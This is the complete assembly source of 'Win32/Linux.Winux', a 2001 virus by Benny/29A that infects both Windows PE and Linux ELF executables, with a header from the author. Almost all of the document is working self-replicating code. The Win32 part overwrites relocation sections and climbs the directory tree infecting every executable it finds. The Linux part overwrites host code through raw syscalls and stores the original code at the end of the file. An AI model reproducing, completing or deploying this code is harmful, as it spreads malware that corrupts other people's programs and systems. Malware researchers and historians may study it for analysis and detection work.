;                          +-----------------------+
;                          :  Win32/Linux.Winux    :
;                          +--+----------------+---+
;                             :  by Benny/29A  :
;                             +----------------+
;
;
;
;Heya ppl,
;
;lemme introduce you my first multi-platform virus, the worlds first
;PE/ELF infector. The idea of first Win32/Linux virus came to my head
;when I was learning Linux viruses. I'm not Linux expert, I couldn't
;code for Linux in assembler - I am familiar with Intel syntax, AT&T
;is a bit chaotic for me. However, I decided to learn more about Linux
;coding and left my place of newbee. I was always fascinated of Linux
;scene and low-level programming under Linux but I never knew much
;about it.
;
;I wanted to code virus for Linux and learn from it. But becoz there
;already exist some viruses and I knew I won't be able to bring any
;new technique, I decided to code something unique -> Win32/Linux
;compatible multi-platform infector. And here you can find the result
;of my trying. Now, after all, I've got some valuable experiencez and
;I'm glad for that. Coding/debugging in Linux was hard for me, but I
;had fun and I learned a lot. And that's the most important.
;
;
;- Technical details -
;
;The virus itself ain't much. It's not big, it's not complicated,
;it's not resident nor polymorphic.. I wanted to be the virus like
;this. Just to show something new, show that something never seen
;before is possible and how can it be coded.
;
;The virus is devided to two partz: Win32 part and Linux part. Every
;part is able to infect both of PE and ELF filez. This source is
;designed to be compiled by TASM under Win32, nevertheless it can
;infect Linux programz and so then it will be able to be executed
;in Linux environment (and there it is also able to infect
;Win32 part, which can be executed in Win32 environment etc etc etc...).
;
;Win32 part:
;------------
;
;Virus infects PE filez by overwritting .reloc section, so it does not
;enlarge host file size. Filez that don't have .reloc section, big
;enough for virus code, can't be infected (explorer.exe can be used to
;test infection capabilities). It can pass thru directory tree by well
;known "dotdot" method ("cd ..") and there infects all PE and ELF
;filez - virus does not check extensionz, it analyses victim's internal
;format and then decidez whata do.
;When all filez are passed and/or infected virus will execute host code.
;
;Linux part:
;------------
;
;Virus infects ELF filez by overwritting host code by viral code. The
;original host code is stored at the end of host file. It can infect
;all filez (both of PE and ELF) in current directory, also without
;checking file extensionz.
;When all filez are passed and/or infected virus will restore host code
;(overwrite itself by original host code) and execute it.
;
;
;Well, you are probably asking how it is possible that virus can infect Win32
;appz from Linux environment and Linux appz from Win32 environment. Yeah,
;many ppl already asked me. For instance, under some emulator. There exist
;some emulatorz (win4lin, wine etc..) which are often used to execute Win32
;appz under Linux. Also, I know many ppl that have partition specially
;reserved for CD burning, where they store both of Win32 and Linux programz.
;Virus executed from there has no problemz with infection, heh ;)
;
;
;Does this virus work? Heh, sure it does. I tested it on Win98, Win2000 and
;RedHat 7.0, and it worked without any problemz. However, if you will find
;any problemz, don't by shy and send me a bug report ;-P
;
;
;- Licence agreement -
;
;This virus is covered by GPL - GNU General Public Licence. All crucial
;facts can be found there. Read it before using!
;
;
;- Last notez -
;
;While I was finishing Universe and coding Winux, many personal thingz
;happened to me. Again such depressive season as only winter can be
;fell down on me.. I'm finishing my high-school, last year, many examz
;(and I know nothing, you know that feeling, heh :) etc. End of next
;stage of my life is getting closer and I don't know how will that next
;one be for me, what it will take and bring to me. I'm looking forward
;to summer, the best season in the year, no depression, no school, no
;fucking problemz I still have and can't hold them all.. c ya l8r,
;somewhere in timespace..
;
;
;
;                                                  +-------------+
;                                                  : Benny / 29A +-+
;                                                  : benny@post.cz +---------+
;(c) March, 2001                                   : http://benny29a.cjb.net :
;Czech Republic                                    +-------------------------+



.386p
.model	flat

include	win32api.inc
include	useful.inc
include	mz.inc
include	pe.inc


.data
	db	?


.code
Start:	pushad
	@SEH_SetupFrame		;setup SEH frame

	call	gdelta
gdelta:	pop	ebp				;ebp=delta offset

	call	get_base			;get K32 base address
	call	get_apis			;find addresses of APIz

	lea	eax,[ebp + prev_dir - gdelta]
	push	eax
	push	MAX_PATH
	call	[ebp + a_GetCurrentDirectoryA - gdelta]
						;get current directory
	push	20
	pop	ecx				;20 passes in directory tree
f_infect:
	push	ecx

	;direct action - infect all PE filez in directory
	lea	esi,[ebp + WFD - gdelta]		;WIN32_FIND_DATA structure
	push	esi					;save its address
	@pushsz	'*.*'					;search for all filez
	call	[ebp + a_FindFirstFileA - gdelta]	;find first file
	inc	eax
	je	e_find				;quit if not found
	dec	eax
	push	eax				;save search handle to stack

f_next:	call	wCheckInfect			;infect found file

	push	esi				;save WFD structure
	push	dword ptr [esp+4]		;and search handle from stack
	call	[ebp + a_FindNextFileA - gdelta];find next file
	test	eax,eax
	jne	f_next				;and infect it

f_close:call	[ebp + a_FindClose - gdelta]	;close search handle

e_find:	@pushsz	'..'
	mov	esi,[ebp + a_SetCurrentDirectoryA - gdelta]
	call	esi				;go upper in directory tree
	pop	ecx
	loop	f_infect			;and again..

	lea	eax,[ebp + prev_dir - gdelta]
	push	eax
	call	esi				;go back to original directory

end_host:
	@SEH_RemoveFrame			;remove SEH frame
	popad

	extrn	ExitProcess
	mov	eax,offset ExitProcess-400000h
original_ep = dword ptr $-4
	add	eax,400000h
image_base = dword ptr $-4
	jmp	eax				;and go back to host program


;INFECT FILE (Win32 version)
wCheckInfect	Proc
	pushad
	@SEH_SetupFrame		;setup SEH frame

	and	dword ptr [ebp + sucElf - gdelta],0
	test	[esi.WFD_dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
	jne	end_seh				;discard directory entries
	xor	ecx,ecx
	cmp	[esi.WFD_nFileSizeHigh],ecx
	jne	end_seh				;discard files >4GB
	mov	eax,[esi.WFD_nFileSizeLow]
	cmp	eax,4000h
	jb	end_seh				;discard small filez
	mov	[ebp + l_lseek - gdelta],eax


	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[esi.WFD_szFileName]
	push	eax
	call	[ebp + a_CreateFileA - gdelta]	;open file
	inc	eax
	je	end_seh
	dec	eax
	mov	[ebp + hFile - gdelta],eax

	cdq
	push	edx
	push	edx
	push	edx
	push	PAGE_READWRITE
	push	edx
	push	eax
	call	[ebp + a_CreateFileMappingA - gdelta]
	cdq
	xchg	eax,ecx
	jecxz	end_cfma
	mov	[ebp + hMapFile - gdelta],ecx

	push	edx
	push	edx
	push	edx
	push	FILE_MAP_WRITE
	push	ecx				;map file to address space
	call	[ebp + a_MapViewOfFile - gdelta]
	xchg	eax,ecx
	jecxz	end_mvof
	mov	[ebp + lpFile - gdelta],ecx
	jmp	n_fileopen

close_file:
	push	12345678h
lpFile = dword ptr $-4				;unmap file
	call	[ebp + a_UnmapViewOfFile - gdelta]
end_mvof:
	push	12345678h
hMapFile = dword ptr $-4
	call	[ebp + a_CloseHandle - gdelta]
end_cfma:
	mov	ecx,12345678h			;was it linux program (ELF)?
sucElf = dword ptr $-4
	jecxz	c_close				;no, close that file

	push	2
	push	0
	push	0
	push	dword ptr [ebp + hFile - gdelta]
	call	[ebp + a_SetFilePointer - gdelta]
						;go to EOF
	push	0
	lea	eax,[ebp + sucElf - gdelta]
	push	eax
	push	virtual_end-Start
	push	12345678h
a_mem = dword ptr $-4
	push	dword ptr [ebp + hFile - gdelta]
	call	[ebp + a_WriteFile - gdelta]
						;write there orig. program part
	push	MEM_RELEASE
	push	0
	push	dword ptr [ebp + a_mem - gdelta]
	call	[ebp + a_VirtualFree - gdelta]
						;and deallocate used memory

c_close:push	12345678h
hFile = dword ptr $-4
	call	[ebp + a_CloseHandle - gdelta]	;close file
	jmp	end_seh				;and quit


n_fileopen:
	call	check_elf
	je	wInfectELF			;is it Linux program (ELF)?
	add	ax,-IMAGE_DOS_SIGNATURE
	jne	close_file
	call	check_pe
	jne	close_file			;is it Win32 program (PE)?

	;important chex
	cmp	word ptr [esi.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
	jne	close_file
	mov	ax,[esi.NT_FileHeader.FH_Characteristics]
	test	ax,IMAGE_FILE_EXECUTABLE_IMAGE
	je	close_file
	test	ax,IMAGE_FILE_DLL
	jne	close_file
	test	ax,IMAGE_FILE_SYSTEM
	jne	close_file
	mov	al,byte ptr [esi.NT_FileHeader.OH_Subsystem]
	test	al,IMAGE_SUBSYSTEM_NATIVE
	jne	close_file

	movzx	eax,word ptr [esi.NT_FileHeader.FH_NumberOfSections]
	dec	eax
	test	eax,eax
	je	close_file
	call	header&relocs			;get PE headerz and check for relocs
	je	close_file			;quit if no relocs

	mov	ebx,[edi.SH_VirtualAddress]
	cmp	eax,ebx
	jne	close_file
	cmp	[edi.SH_SizeOfRawData],virus_end-Start+500
	jb	close_file			;is it large enough?

	pushad
	xor	eax,eax
	mov	edi,edx
	stosd
	stosd
	popad					;erase relocs record

	call	set_alignz			;align section variable
	push	dword ptr [ebp + original_ep - gdelta]
	push	dword ptr [ebp + image_base - gdelta]
						;save used variablez
	mov	eax,[esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
	mov	[esi.NT_OptionalHeader.OH_AddressOfEntryPoint],ebx
	mov	[ebp + original_ep - gdelta],eax
	mov	eax,[esi.NT_OptionalHeader.OH_ImageBase]
	mov	[ebp + image_base - gdelta],eax
						;set variablez
	pushad
	mov	edi,[edi.SH_PointerToRawData]
	add	edi,[ebp + lpFile - gdelta]
	lea	esi,[ebp + Start - gdelta]
	mov	ecx,virus_end-Start
	rep	movsb				;overwrite relocs by virus body
	popad
	pop	dword ptr [ebp + image_base - gdelta]
	pop	dword ptr [ebp + original_ep - gdelta]
						;restore used variablez
	or	dword ptr [edi.SH_Characteristics],IMAGE_SCN_MEM_WRITE
	jmp	close_file			;set flag and quit
wCheckInfect	EndP


;INFECT LINUX PROGRAM (Win32 version)
wInfectELF	Proc
	mov	edi,ecx
	movzx	eax,word ptr [edi+12h]
	cmp	eax,3
	jne	close_file

	call	get_elf			;get elf headerz

p_sectionz:
	mov	eax,[esi+0Ch]		;virtual address
	add	eax,[esi+14h]		;virtual size
	cmp	ebx,eax
	jb	got_section		;does EP fit to this section?
	add	esi,edx			;no, get to next record
	loop	p_sectionz		;ECX-timez
	jmp	close_file		;invalid ELF, quit

got_section:
	mov	eax,[ebp + Start - gdelta]
	mov	ecx,[esi+10h]
	add	ecx,edi
	cmp	[ecx],eax
	je	close_file		;infection check

	mov	eax,[esi+14h]
	cmp	eax,virtual_end-Start
	jb	close_file		;must be large enough

	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	eax
	push	0
	call	[ebp + a_VirtualAlloc - gdelta]
	test	eax,eax			;allocate buffer for host code
	je	close_file
	mov	[ebp + a_mem - gdelta],eax

	pushad
	mov	ecx,[esi+14h]
	mov	esi,[esi+10h]
	add	esi,edi
	push	esi
	xchg	eax,edi
	rep	movsb			;copy host code to our buffer

	pop	edi
	lea	esi,[ebp + Start - gdelta]
	mov	ecx,virtual_end-Start
	rep	movsb			;overwrite host code by virus body
	popad
	add	dword ptr [edi+18h],LinuxStart-Start
	mov	[ebp + sucElf - gdelta],edi
	jmp	close_file		;set semaphore and quit
wInfectELF	EndP



;this procedure can retrieve API addresses
get_apis	Proc
	pushad
	@SEH_SetupFrame	
	lea	esi,[ebp + crc32s - gdelta]	;get ptr to CRC32 values of APIs
	lea	edi,[ebp + a_apis - gdelta]	;where to store API addresses
	push	crc32c    		;how many APIs do we need
	pop	ecx			;in ECX...
g_apis:	push	eax			;save K32 base
	call	get_api
	stosd				;save address
	test	eax,eax
	pop	eax
	je	q_gpa			;quit if not found
	add	esi,4			;move to next CRC32 value
	loop	g_apis			;search for API addresses in a loop
end_seh:@SEH_RemoveFrame		;remove SEH frame
	popad				;restore all registers
	ret				;and quit from procedure
q_gpa:	@SEH_RemoveFrame
	popad
	pop	eax
	jmp	end_host		;quit if error
get_apis	EndP


;this procedure can retrieve address of given API
get_api		Proc
	pushad				;store all registers
	@SEH_SetupFrame	;setup SEH frame
	mov	edi,[eax.MZ_lfanew]	;move to PE header
	add	edi,eax			;...
	mov	ecx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size]
	jecxz	end_gpa			;quit if no exports
	mov	ebx,eax
	add	ebx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	mov	edx,eax			;get address of export table
	add	edx,[ebx.ED_AddressOfNames]	;address of API names
	mov	ecx,[ebx.ED_NumberOfNames]	;number of API names
	mov	edi,edx
	push	dword ptr [esi]		;save CRC32 to stack
	mov	ebp,eax
	xor	eax,eax
APIname:push	eax
	mov	esi,ebp			;get base
	add	esi,[edx+eax*4]		;move to API name
	push	esi			;save address
	@endsz				;go to the end of string
	sub	esi,[esp]		;get string size
	mov	edi,esi			;move it to EDI
	pop	esi			;restore address of API name
	call	CRC32			;calculate CRC32 of API name
	cmp	eax,[esp+4]		;is it right API?
	pop	eax
	je	g_name			;yeah, we got it
	inc	eax                     ;increment counter
	loop	APIname			;and search for next API name
	pop	eax
end_gpa:xor	eax, eax		;set flag
ok_gpa:	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_eax],eax	;save value to stack
	popad				;restore all registers
        ret				;quit from procedure
g_name:	pop	edx
	mov	edx,ebp
	add	edx,[ebx.ED_AddressOfOrdinals]
	movzx	eax,word ptr [edx+eax*2]
	cmp	eax,[ebx.ED_NumberOfFunctions]
	jae	end_gpa-1
	mov	edx,ebp			;base of K32
	add	edx,[ebx.ED_AddressOfFunctions]	;address of API functions
	add	ebp,[edx+eax*4]		;get API function address
	xchg	eax,ebp			;we got address of API in EAX
	jmp	ok_gpa			;quit
get_api		EndP


;this procedure can retrieve base address of K32
get_base	Proc
	push	ebp			;store EBP
	call	gdlt			;get delta offset
gdlt:	pop	ebp			;to EBP

	mov	eax,12345678h		;get lastly used address
last_kern = dword ptr $-4
	call	check_kern		;is this address valid?
	jecxz	end_gb			;yeah, we got the address

	call	gb_table		;jump over the address table
	dd	077E00000h		;NT/W2k
	dd	077E80000h		;NT/W2k
	dd	077ED0000h		;NT/W2k
	dd	077F00000h		;NT/W2k
	dd	0BFF70000h		;95/98
gb_table:
	pop	edi			;get pointer to address table
	push	4			;get number of items in the table
	pop	esi			;to ESI
gbloop:	mov	eax,[edi+esi*4]		;get item
	call	check_kern		;is address valid?
	jecxz	end_gb			;yeah, we got the valid address
	dec	esi			;decrement ESI
	test	esi,esi			;end of table?
	jne	gbloop			;nope, try next item

	call	scan_kern		;scan the address space for K32
end_gb:	pop	ebp			;restore EBP
	ret				;quit

check_kern:				;check if K32 address is valid
	mov	ecx,eax			;make ECX != 0
	pushad				;store all registers
	@SEH_SetupFrame		;setup SEH frame
	movzx	edx,word ptr [eax]	;get two bytes
	add	edx,-"ZM"		;is it MZ header?
	jne	end_ck			;nope
	mov 	ebx,[eax.MZ_lfanew]	;get pointer to PE header
	add	ebx,eax			;normalize it
	mov	ebx,[ebx]		;get four bytes
	add	ebx,-"EP"		;is it PE header?
	jne	end_ck			;nope
	xor	ecx,ecx			;we got K32 base address
	mov	[ebp + last_kern - gdlt],eax	;save K32 base address
end_ck:	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_ecx],ecx	;save ECX
	popad				;restore all registers
	ret				;if ECX == 0, address was found

SEH_hndlr macro				;macro for SEH
        @SEH_RemoveFrame		;remove SEH frame
	popad				;restore all registers
        add	dword ptr [ebp + bAddr - gdlt],1000h	;explore next page
        jmp	bck			;continue execution
endm

scan_kern:				;scan address space for K32
bck:    pushad				;store all registers
	@SEH_SetupFrame		;setup SEH frame
	mov	eax,077000000h		;starting/last address
bAddr = dword ptr $-4
	movzx	edx,word ptr [eax]	;get two bytes
	add	edx,-"ZM"		;is it MZ header?
	jne	pg_flt			;nope
	mov 	edi,[eax.MZ_lfanew]	;get pointer to PE header
	add	edi,eax			;normalize it
	mov	ebx,[edi]		;get four bytes
	add	ebx,-"EP"		;is it PE header?
	jne	pg_flt			;nope
	mov	ebx,eax
	mov	esi,eax
	add	ebx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	add	esi,[ebx.ED_Name]
	mov	esi,[esi]
	add	esi,-'NREK'
	je	end_sk
pg_flt:	xor	ecx,ecx			;we got K32 base address
	mov	[ecx],esi		;generate PAGE FAULT! search again...
end_sk:	mov	[ebp + last_kern - gdlt],eax	;save K32 base address
	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_eax],eax	;save EAX - K32 base
	popad				;restore all registers
	ret
get_base	EndP


CRC32:	push	ecx			;procedure for calculating CRC32s
	push	edx			;at run-time
	push	ebx       
        xor	ecx,ecx   
        dec	ecx        
        mov	edx,ecx   
NextByteCRC:           
        xor	eax,eax   
        xor	ebx,ebx   
        lodsb          
        xor	al,cl     
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0EDB8h
NoCRC:  dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
        dec	edi
	jne	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx
	pop	ecx
	ret


signature		db	0,'[Win32/Linux.Winux] multi-platform virus by Benny/29A',0
					;little signature of mine ;-)

;Viral entrypoint in Linux programz
LinuxStart:
	push	eax			;reserve variable for return to host
	pushad
	mov	ebx,[esp.cPushad+8]	;get command line
	call	lgdelta
lgdelta:pop	ebp			;ebp=delta offset

	mov	ecx,end_end_lhost-end_lhost
	sub	esp,ecx
	mov	edi,esp
	lea	esi,[ebp + end_lhost - lgdelta]
	rep	movsb			;copy virus to stack and jump there
	jmp	esp			;(becoz we need to restore host code back)

end_lhost	Proc
	push	ebx
	push	125
	pop	eax
	lea	ebx,[ebp + Start - lgdelta]
	and	ebx,0FFFFF000h
	mov	ecx,3000h
	mov	edx,7
	int	80h			;deprotect code section
	pop	ebx

	push	5
	pop	eax
	xor	ecx,ecx
	int	80h			;open host file
	xchg	eax,ebx
	test	ebx,ebx
	jns	read_host
q_host:	xor	eax,eax
	inc	eax
	push	-1
	pop	ebx
	int	80h			;quit if error

read_host:
	push	19
	pop	eax
	mov	ecx,12345678h
l_lseek = dword ptr $-4
	cdq
	int	80h			;seek to saved host code (EOF - some bytez)
	test	eax,eax
	js	q_host

	pushad
	push	5
	pop	eax
	call	cur_dir
	db	'.',0
cur_dir:pop	ebx
	xor	ecx,ecx
	cdq
	int	80h			;get current directory descriptor
	xchg	eax,ebx
inf_dir:push	89
	pop	eax
	lea	ecx,[ebp + WFD - lgdelta]
	int	80h			;get file from directory
	xchg	eax,ecx
	jecxz	cldir			;no more filez..
	add	eax,10
	call	lCheckInfect		;try to infect it
	jmp	inf_dir			;and look for another file
cldir:	push	6
	pop	eax
	int	80h			;close directory descriptor
	popad

	push	3
	pop	eax
	lea	ecx,[ebp + Start - lgdelta]
	mov	edi,ecx
	mov	edx,virtual_end-Start
	int	80h			;restore host code
	test	eax,eax
	js	q_host
	push	6
	pop	eax
	int	80h			;close host file descriptor

	add	esp,end_end_lhost-end_lhost
	mov	[esp.cPushad],edi	;write host entrypoint address
	popad
	ret				;and jump to there


;INFECT FILE (Linux version)
lCheckInfect	Proc
	pushad

	xchg	eax,ebx
	push	5
	pop	eax
	cdq
	inc	edx
	inc	edx
	mov	ecx,edx
	int	80h			;open file
	xchg	eax,ebx
	test	ebx,ebx
	jns	c_open
	popad
	ret

c_open:	mov	[ebp + f_handle - lgdelta],ebx
	push	19
	pop	eax
	xor	ecx,ecx
	int	80h			;seek to EOF = get file size
	mov	[ebp + l_lseek - lgdelta],eax
					;save it
	push	ecx
	push	ebx
	inc	ecx
	push	ecx
	inc	ecx
	inc	ecx
	push	ecx
	push	eax
	xor	ecx,ecx
	push	ecx
	mov	ebx,esp
	push	90
	pop	eax
	int	80h			;map file to address space
	add	esp,24
	cmp	eax,0FFFFF000h
	jbe	c_mmap			;quit if error
	jmp	c_file

c_mmap:	mov	ecx,eax
	mov	[ebp + fm_handle - lgdelta],eax
	pushad
	call	check_elf
	je	lInfectELF		;is it Linux program (ELF)?
	add	ax,-IMAGE_DOS_SIGNATURE
	jne	c_mfile
	call	check_pe
	jne	c_mfile			;is it Win32 program (PE)?

	;some important chex
	cmp	word ptr [esi.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
	jne	c_mfile
	mov	ax,[esi.NT_FileHeader.FH_Characteristics]
	test	ax,IMAGE_FILE_EXECUTABLE_IMAGE
	je	c_mfile
	test	ax,IMAGE_FILE_DLL
	jne	c_mfile
	test	ax,IMAGE_FILE_SYSTEM
	jne	c_mfile
	mov	al,byte ptr [esi.NT_FileHeader.OH_Subsystem]
	test	al,IMAGE_SUBSYSTEM_NATIVE
	jne	c_mfile

	movzx	eax,word ptr [esi.NT_FileHeader.FH_NumberOfSections]
	dec	eax
	test	eax,eax
	je	c_mfile
	call	header&relocs		;get PE headerz and check for relocs
	je	c_mfile			;quit if no relocs

	mov	ebx,[edi.SH_VirtualAddress]
	cmp	eax,ebx
	jne	c_mfile
	cmp	[edi.SH_SizeOfRawData],virus_end-Start+500
	jb	c_mfile			;is it large enough?

	pushad
	xor	eax,eax
	mov	edi,edx
	stosd
	stosd
	popad				;clear relocs record

	call	set_alignz		;align section variable
	mov	eax,[esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
	mov	[esi.NT_OptionalHeader.OH_AddressOfEntryPoint],ebx
	mov	[ebp + original_ep - lgdelta],eax
	mov	eax,[esi.NT_OptionalHeader.OH_ImageBase]
	mov	[ebp + image_base - lgdelta],eax
					;set some important variablez
	pushad
	mov	edi,[edi.SH_PointerToRawData]
	add	edi,[esp+24]
	lea	esi,[ebp + Start - lgdelta]
	mov	ecx,virus_end-Start
	rep	movsb			;overwrite relocs by virus code
	popad
	or	dword ptr [edi.SH_Characteristics],IMAGE_SCN_MEM_WRITE
					;set flag
c_mfile:popad
	push	91
	pop	eax
	int	80h			;unmap file
c_file:	push	6
	pop	eax
	mov	ebx,[ebp + f_handle - lgdelta]
	int	80h			;close file descriptor
	popad
	ret				;and quit
lCheckInfect	EndP


;INFECT LINUX PROGRAM (Linux version)
lInfectELF	Proc
	mov	edi,ecx
	movzx	eax,word ptr [edi+12h]
	cmp	eax,3
	jne	c_mfile

	call	get_elf			;get ELF headerz

p_sectionz2:
	mov	eax,[esi+0Ch]		;virtual address
	add	eax,[esi+14h]		;virtual size
	cmp	ebx,eax
	jb	got_section2		;does EP fit to this section?
	add	esi,edx			;no, get to next record
	loop	p_sectionz2		;ECX-timez
	jmp	c_mfile			;invalid ELF, quit

got_section2:
	mov	eax,[ebp + Start - lgdelta]
	mov	ecx,[esi+10h]
	add	ecx,edi
	cmp	[ecx],eax
	je	c_mfile			;infection check

	mov	eax,[esi+14h]
	cmp	eax,virtual_end-Start
	jb	c_mfile			;is it large enough?

	sub	esp,eax			;create buffer in stack
	mov	[ebp + s_mem - lgdelta],eax

	add	dword ptr [edi+18h],LinuxStart-Start
	mov	ecx,[esi+14h]
	mov	esi,[esi+10h]
	add	esi,edi
	mov	eax,esi
	mov	edi,esp
	rep	movsb			;copy original host code there

	mov	edi,eax
	lea	esi,[ebp + Start - lgdelta]
	mov	ecx,virtual_end-Start
	rep	movsb			;overwrite host code by virus

	push	91
	pop	eax
	mov	ebx,[ebp + fm_handle - lgdelta]
	int	80h			;unmap file

	push	19
	pop	eax
	mov	ebx,[ebp + f_handle - lgdelta]
	xor	ecx,ecx
	cdq
	inc	edx
	inc	edx
	int	80h			;go to EOF

	push	4
	pop	eax
	mov	ecx,esp
	mov	edx,virtual_end-Start
	int	80h			;write there original host code

	add	esp,[ebp + s_mem - lgdelta]
	popad				;correct stack
	jmp	c_file			;and close the file
lInfectELF	EndP


;check if it is Linux program (ELF)
check_elf	Proc
	mov	eax,[ecx]
	push	eax
	add	eax,-464C457Fh
	pop	eax
	ret
check_elf	EndP


;check if it is Win32 program (PE)
check_pe	Proc
	mov	eax,[ecx.MZ_lfanew]
	add	eax,ecx
	xchg	eax,esi
	mov	eax,[esi]
	add	eax,-IMAGE_NT_SIGNATURE
	ret
check_pe	EndP


;get some variablez and check for relocationz in PE file
header&relocs	Proc
	imul	eax,eax,IMAGE_SIZEOF_SECTION_HEADER
	movzx	edx,word ptr [esi.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	edi,[eax+edx+IMAGE_SIZEOF_FILE_HEADER+4]
	add	edi,esi
	lea	edx,[esi.NT_OptionalHeader.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress]
	mov	eax,[edx]
	test	eax,eax
	ret
header&relocs	EndP


;align section variable
set_alignz	Proc
	mov	eax,virtual_end-Start
	cmp	eax,[edi.SH_VirtualSize]
	jb	o_vs
	mov	ecx,[esi.NT_OptionalHeader.OH_SectionAlignment]
	cdq
	div	ecx
	test	edx,edx
	je	o_al
	inc	eax
o_al:	mul	ecx
	mov	[edi.SH_VirtualSize],eax
o_vs:	ret
set_alignz	EndP


;get some important variablez from Linux program (ELF)
get_elf	Proc
	mov	ebx,[edi+18h]		;EP
	mov	esi,[edi+20h]		;section header
	add	esi,edi			;normalize
	movzx	edx,word ptr [edi+2Eh]	;size of section header
	movzx	ecx,word ptr [edi+30h]	;number of sectionz
	ret
get_elf	EndP


end_end_lhost:
end_lhost	EndP

gpl			db	'This GNU program is covered by GPL.',0
					;licence agreement ;-)

;CRC32s of used APIz
crc32s:			dd	0AE17EBEFh	;FindFirstFileA
			dd	0AA700106h	;FindNextFileA
			dd	0C200BE21h	;FindClose
			dd	08C892DDFh	;CreateFileA
			dd	096B2D96Ch	;CreateFileMappingA
			dd	0797B49ECh	;MapViewOfFile
			dd	094524B42h	;UnmapViewOfFile
			dd	068624A9Dh	;CloseHandle
			dd	04402890Eh	;VirtualAlloc
			dd	02AAD1211h	;VirtualFree
			dd	021777793h	;WriteFile
			dd	085859D42h	;SetFilePointer
			dd	0EBC6C18Bh	;GetCurrentDirectoryA
			dd	0B2DBD7DCh	;SetCurrentDirectoryA
			dd	07495B3ADh	;OutputDebugStringA
crc32c = ($-crc32s)/4				;number of APIz

virus_end:

;addresses of APIz
a_apis:
a_FindFirstFileA	dd	?
a_FindNextFileA		dd	?
a_FindClose		dd	?
a_CreateFileA		dd	?
a_CreateFileMappingA	dd	?
a_MapViewOfFile		dd	?
a_UnmapViewOfFile	dd	?
a_CloseHandle		dd	?
a_VirtualAlloc		dd	?
a_VirtualFree		dd	?
a_WriteFile		dd	?
a_SetFilePointer	dd	?
a_GetCurrentDirectoryA	dd	?
a_SetCurrentDirectoryA	dd	?
a_OutputDebugStringA	dd	?

f_handle		dd	?		;file handle
fm_handle		dd	?		;file mapping handle
s_mem			dd	?		;size of host code (for stack manipulationz)
WFD		WIN32_FIND_DATA	?		;WIN32_FIND_DATA structure
prev_dir		db	MAX_PATH dup (?);original directory

virtual_end:
ends
End	Start					;that's all folx, wasn't that kewl? ;-)
